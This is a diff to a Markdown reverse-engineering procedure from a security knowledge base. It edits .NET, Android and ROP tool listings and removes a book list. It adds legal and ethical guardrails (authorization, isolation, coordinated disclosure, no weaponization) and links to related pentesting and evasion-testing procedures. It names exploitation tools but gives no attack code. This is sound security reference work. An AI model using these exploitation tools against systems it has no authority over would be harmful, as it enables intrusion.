@@ -2586,7 +2506,7 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
 **.NET:**
 - **dnSpyEx** - [github.com/dnSpyEx/dnSpy](https://github.com/dnSpyEx/dnSpy) (active community fork; legacy `dnSpy/dnSpy` archived 2020-12-21)
 - **ILSpy** - [github.com/icsharpcode/ILSpy](https://github.com/icsharpcode/ILSpy)
-- **.NET Deobfuscation Guide** - [github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+- **.NET Obfuscator list** - [github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator) (identify the protector before choosing a deobfuscator)
 
 **Android:**
 - **JADX** - [github.com/skylot/jadx](https://github.com/skylot/jadx)
@@ -2599,18 +2519,6 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
   - ROP gadget finder
 - **ropper** - [github.com/sashs/Ropper](https://github.com/sashs/Ropper)
   - Advanced ROP gadget finder with semantic search
-- **one_gadget** - [github.com/david942j/one_gadget](https://github.com/david942j/one_gadget)
-  - Find one-shot RCE gadgets in libc
-
-### Books & Courses
-- **Practical Reverse Engineering** by Bruce Dang et al.
-- **The IDA Pro Book** by Chris Eagle
-- **Reversing: Secrets of Reverse Engineering** by Eldad Eilam
-- **The Art of Software Security Assessment** by Mark Dowd et al.
-- **Hacking: The Art of Exploitation** by Jon Erickson
-- **SANS FOR610: Reverse-Engineering Malware**
-- **SANS FOR710: Reverse Engineering Malware Advanced**
-- **RPISEC Modern Binary Exploitation (MBE)** - [github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
 
 ### Community & Forums
 - **Reddit r/ReverseEngineering** - [reddit.com/r/ReverseEngineering](https://www.reddit.com/r/ReverseEngineering/)
@@ -2623,12 +2531,31 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
 
 ---
 
+## Legal & Ethical Considerations
+
+Canonical legal framework: see [[../../Investigations/Techniques/sop-legal-ethics|Legal & Ethics]]. The RE-specific statutes (interoperability and security-research exemptions) are summarised under [Overview → Legal & Ethical Considerations](#legal--ethical-considerations); do not re-derive them here.
+
+OPSEC for the analyst (lab isolation, sample handling, network egress): see [[../../Investigations/Techniques/sop-opsec-plan|OPSEC Plan]].
+
+**Reverse-engineering-specific guardrails:**
+
+- **Authorization in writing.** Name the target binaries or firmware, the owner or client, the permitted actions (static analysis, debugging, patching, exploitation testing) and the disclosure path before you start. Your own code, crackmes and CTF binaries need no sign-off; third-party software does.
+- **Licence and EULA terms.** Check "no reverse engineering" clauses and the statutory exceptions above before analysing commercial software; patching licence checks on software you do not hold the rights to is out of scope.
+- **Lab isolation for live samples.** Execute malware and untrusted binaries only in an isolated, disposable VM with no route to production, per the OPSEC Plan.
+- **Disclosure path.** Vulnerabilities found while reversing go to the vendor or coordinator (CERT, bug-bounty programme) under coordinated disclosure; see [[../Pentesting/sop-vulnerability-research|Vulnerability Research]] and [[../Pentesting/sop-bug-bounty|Bug Bounty Hunting]].
+- **No weaponization.** Proof-of-concept work stops at demonstrating the bug (crash, controlled return address, benign call). Do not build or distribute working payloads, droppers or evasion tooling for live targets.
+- **Log every action.** Binary hashes, tool versions, patches applied and test environment, per the [[../../Investigations/Techniques/sop-collection-log|Collection Log]] format.
+- **CSAM / illegal content.** If a sample, firmware image or unpacked payload contains child sexual abuse material or other content that is illegal to possess, stop, preserve without re-opening, and route via [[../../Investigations/Techniques/sop-sensitive-crime-intake-escalation|Sensitive Crime Intake & Escalation]].
+
+---
+
 **Related SOPs:**
 
 **Analysis:**
 - [[sop-malware-analysis|Malware Analysis]] - Comprehensive malware reverse engineering and behavioral analysis
 - [[sop-cryptography-analysis|Cryptography Analysis]] - Analyzing encryption and cryptographic implementations
 - [[sop-hash-generation-methods|Hash Generation Methods]] - File integrity and hash analysis techniques
+- [[sop-forensics-investigation|Forensics Investigation]] - Digital forensics and incident response
 
 **Pentesting & Security:**
 - [[../Pentesting/sop-linux-pentest|Linux Pentesting]] - Linux exploitation and privilege escalation
@@ -2639,4 +2566,9 @@ emit data.bin | xor key:0x13 | zl | carve url | peek
 - [[../Pentesting/sop-vulnerability-research|Vulnerability Research]] - Finding and analyzing security flaws
 - [[../Pentesting/sop-bug-bounty|Bug Bounty Hunting]] - Responsible vulnerability disclosure
 - [[../Pentesting/sop-detection-evasion-testing|Detection Evasion Testing]] - Bypassing security controls
-- [[sop-forensics-investigation|Forensics Investigation]] - Digital forensics and incident response
+
+---
+
+**Version:** 1.0
+**Last Updated:** 2026-10-31
+**Review Frequency:** Annual (slow-rot fundamentals; tool releases, CLI syntax and mitigation defaults drift faster)
